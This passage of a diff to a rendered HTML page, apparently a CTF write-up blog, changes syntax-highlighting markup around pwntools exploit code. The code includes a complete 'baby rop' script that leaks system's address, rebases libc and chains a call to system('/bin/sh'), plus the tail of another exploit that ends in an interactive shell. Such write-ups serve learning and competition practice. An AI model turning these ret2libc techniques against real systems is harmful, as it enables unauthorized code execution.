+</span></span><span style="display:flex;"><span>isAllowed_addr <span style="color:#f92672">=</span> int(proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;isAllowed_addr: </span><span style="color:#e6db74">{</span>hex(isAllowed_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> build(isAllowed_addr, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">6</span>)
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># shellit</span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><blockquote>
 <p><code>flag{forgot_to_save}</code></p>
 </blockquote>
 <h3 id="baby-rop">baby rop</h3>
@@ -544,75 +542,74 @@ proc<span style="color:#f92672">.</span>interactive()
 <p>Thus with this in mind we run the binary and see that it leaks two address values. The first is some random address <code>lol</code> that refers to very little in memory. The second however <code>system plez</code> is the address of the <code>system</code> function in the <strong>binary</strong> (not libc). We can collect this leak for usage in rebasing the binary.</p>
 <p>With that in hand we can use the difference between the leaked system address and the one in <code>libc</code> to calculate the base address of <code>libc</code> using the handy pwntools syntax:</p>
 <p><code>libc.address = system_addr - libc.symbols['system']</code></p>
-<p>This will now allow us to interact with arbitrary <code>libc</code> functions and grab helpful strings using pwntool' search method. Thus we proceed marking <code>libc</code> as a input for the <code>ROP</code> method and then exploiting one of the most powerful oneliners in pwntools:</p>
+<p>This will now allow us to interact with arbitrary <code>libc</code> functions and grab helpful strings using pwntool&rsquo; search method. Thus we proceed marking <code>libc</code> as a input for the <code>ROP</code> method and then exploiting one of the most powerful oneliners in pwntools:</p>
 <p><code>rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])</code></p>
 <p>Which will construct all the necessary bits and pieces to call <code>system(&quot;/bin/sh&quot;)</code> for us once we take over the return pointer. Thus in similar fashion to other buffer overflow challenges we use the <code>flat()</code> method in combination with <code>rop.chain()</code> to insert our constructed chain at the return. Running this against remote works great and we take home a <code>400 pt</code> flag!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">PATH <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Chals&#39;</span>
-BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;babyrop&#39;</span>
-HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ctfo.2pmc.net:7888&#39;</span>
-
-LIBC_REMOTE <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>PATH<span style="color:#e6db74">}</span><span style="color:#e6db74">/libc/libc-2.28.so&#39;</span>
-LIBC_LOCAL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>
-
-<span style="color:#75715e"># ::::::::::::::::::::::: CHECK SEC ::::::::::::::::::::::::</span>
-
-<span style="color:#e6db74">&#39;&#39;&#39;
-</span><span style="color:#e6db74">    Arch:     amd64-64-little
-</span><span style="color:#e6db74">    RELRO:    Partial RELRO
-</span><span style="color:#e6db74">    Stack:    No canary found
-</span><span style="color:#e6db74">    NX:       NX enabled
-</span><span style="color:#e6db74">    PIE:      No PIE (0x400000)
-</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
-
-<span style="color:#75715e"># ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
-
-context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pwn</span>(args):
-    <span style="color:#e6db74">&#34;&#34;&#34; hack the program &#34;&#34;&#34;</span>
-    binary <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;./</span><span style="color:#e6db74">{</span>PATH<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>BINARY<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
-    proc <span style="color:#f92672">=</span> process(binary)
-    rop <span style="color:#f92672">=</span> ROP(binary)
-    elf <span style="color:#f92672">=</span> ELF(binary, <span style="color:#66d9ef">False</span>)
-    libc <span style="color:#f92672">=</span> ELF(LIBC_LOCAL, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
-
-    <span style="color:#66d9ef">if</span> (args<span style="color:#f92672">.</span>remote):
-        host <span style="color:#f92672">=</span> HOST<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
-        proc <span style="color:#f92672">=</span> remote(host[<span style="color:#ae81ff">0</span>], int(host[<span style="color:#ae81ff">1</span>]))
-        <span style="color:#66d9ef">try</span>: libc <span style="color:#f92672">=</span> ELF(LIBC_REMOTE, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
-        <span style="color:#66d9ef">except</span>: libc <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
-
-
-    <span style="color:#75715e">## get da banner</span>
-    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Receiving banner ...&#39;</span>)
-    pause()
-    <span style="color:#75715e"># proc.recvuntil(&#39;&gt; &#39;)</span>
-    banner <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;lol: &#39;</span>)
-    lol_addr <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
-    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;lol was </span><span style="color:#e6db74">{</span>lol_addr<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
-    proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;system leak plz: &#39;</span>)
-    system_addr <span style="color:#f92672">=</span> int(proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>), <span style="color:#ae81ff">16</span>)
-    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;System addr: </span><span style="color:#e6db74">{</span>hex(system_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
-
-    <span style="color:#75715e"># offset for overflow</span>
-    offset <span style="color:#f92672">=</span> cyclic_find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;kaaa&#39;</span>)
-    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Offset: </span><span style="color:#e6db74">{</span>offset<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
-
-    <span style="color:#75715e"># rebase libc using leak</span>
-    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> system_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
-    rop <span style="color:#f92672">=</span> ROP(libc)
-    rop<span style="color:#f92672">.</span>call(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>], [next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))])
-
-    <span style="color:#75715e"># construct payload</span>
-    payload <span style="color:#f92672">=</span> flat({
-        offset: rop<span style="color:#f92672">.</span>chain()
-    })
-
-    proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, payload)
-
-    <span style="color:#75715e"># shellit</span>
-    proc<span style="color:#f92672">.</span>interactive()
-
-</code></pre></div><blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>PATH <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Chals&#39;</span>
+</span></span><span style="display:flex;"><span>BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;babyrop&#39;</span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ctfo.2pmc.net:7888&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>LIBC_REMOTE <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>PATH<span style="color:#e6db74">}</span><span style="color:#e6db74">/libc/libc-2.28.so&#39;</span>
+</span></span><span style="display:flex;"><span>LIBC_LOCAL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ::::::::::::::::::::::: CHECK SEC ::::::::::::::::::::::::</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Arch:     amd64-64-little
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    RELRO:    Partial RELRO
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Stack:    No canary found
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    NX:       NX enabled
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    PIE:      No PIE (0x400000)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pwn</span>(args):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34; hack the program &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    binary <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;./</span><span style="color:#e6db74">{</span>PATH<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>BINARY<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>    proc <span style="color:#f92672">=</span> process(binary)
+</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> ROP(binary)
+</span></span><span style="display:flex;"><span>    elf <span style="color:#f92672">=</span> ELF(binary, <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> ELF(LIBC_LOCAL, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (args<span style="color:#f92672">.</span>remote):
+</span></span><span style="display:flex;"><span>        host <span style="color:#f92672">=</span> HOST<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>        proc <span style="color:#f92672">=</span> remote(host[<span style="color:#ae81ff">0</span>], int(host[<span style="color:#ae81ff">1</span>]))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>: libc <span style="color:#f92672">=</span> ELF(LIBC_REMOTE, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>: libc <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">## get da banner</span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Receiving banner ...&#39;</span>)
+</span></span><span style="display:flex;"><span>    pause()
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># proc.recvuntil(&#39;&gt; &#39;)</span>
+</span></span><span style="display:flex;"><span>    banner <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;lol: &#39;</span>)
+</span></span><span style="display:flex;"><span>    lol_addr <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;lol was </span><span style="color:#e6db74">{</span>lol_addr<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;system leak plz: &#39;</span>)
+</span></span><span style="display:flex;"><span>    system_addr <span style="color:#f92672">=</span> int(proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;System addr: </span><span style="color:#e6db74">{</span>hex(system_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># offset for overflow</span>
+</span></span><span style="display:flex;"><span>    offset <span style="color:#f92672">=</span> cyclic_find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;kaaa&#39;</span>)
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Offset: </span><span style="color:#e6db74">{</span>offset<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># rebase libc using leak</span>
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> system_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> ROP(libc)
+</span></span><span style="display:flex;"><span>    rop<span style="color:#f92672">.</span>call(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>], [next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># construct payload</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> flat({
+</span></span><span style="display:flex;"><span>        offset: rop<span style="color:#f92672">.</span>chain()
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellit</span>
+</span></span><span style="display:flex;"><span>    proc<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><blockquote>
 <p><code>flag{s0_y0u_c@n_r0p??}</code></p>
 </blockquote>
 
@@ -701,7 +698,7 @@ context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</s
 
 
 
-<script type="text/javascript" src="/bundle.min.549d9d8402283235466245c699b04a81b6fb2c75fc03669ba95af9f5e8ad22ab134f177abab9e431efc3441fe5921fd3fb3f8bf50f66dffbdce9eb7994ef69dc.js" integrity="sha512-VJ2dhAIoMjVGYkXGmbBKgbb7LHX8A2abqVr59eitIqsTTxd6urnkMe/DRB/lkh/T&#43;z&#43;L9Q9m3/vc6et5lO9p3A=="></script>
+<script type="text/javascript" src="/bundle.min.755e4cf350f154c0fee20aa6a1b7fa2b35fcbeaaf4cc62ef45531b19ae1fd43e5ed19c3c3bbf522045953eaef03e1cb96a64a636782486a3aa0b0563d0ef5406.js" integrity="sha512-dV5M81DxVMD&#43;4gqmobf6KzX8vqr0zGLvRVMbGa4f1D5e0Zw8O79SIEWVPq7wPhy5amSmNngkhqOqCwVj0O9UBg=="></script>
 
 
 
